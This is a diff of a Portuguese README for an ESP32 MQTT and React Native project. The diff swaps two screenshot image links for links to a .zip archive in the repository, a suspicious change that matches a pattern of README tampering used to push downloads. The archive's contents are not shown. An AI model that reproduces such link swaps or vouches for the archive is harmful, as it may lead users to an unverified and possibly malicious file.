@@ -35,11 +35,11 @@
 
 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/175426789-80af94da-271b-49e9-9953-ae6947d8781b.JPG" width="200px" />
+<img src="https://raw.githubusercontent.com/joaopedro711/ESP32_MQTT_ReactNative/main/react_mqtt/assets/Native_React_ES_MQT_3.3.zip" width="200px" />
 </div>         
 
 <div align="center">
-<img src="https://user-images.githubusercontent.com/90197643/175426936-a50d35ea-c99e-4bb9-b6f4-d25e5e650ada.JPG" width="200px" />
+<img src="https://raw.githubusercontent.com/joaopedro711/ESP32_MQTT_ReactNative/main/react_mqtt/assets/Native_React_ES_MQT_3.3.zip" width="200px" />
 </div>     
 
 <p>6° - É necessário rodar o código no ESP32, dessa forma ele também se conectará ao Broker. </p>
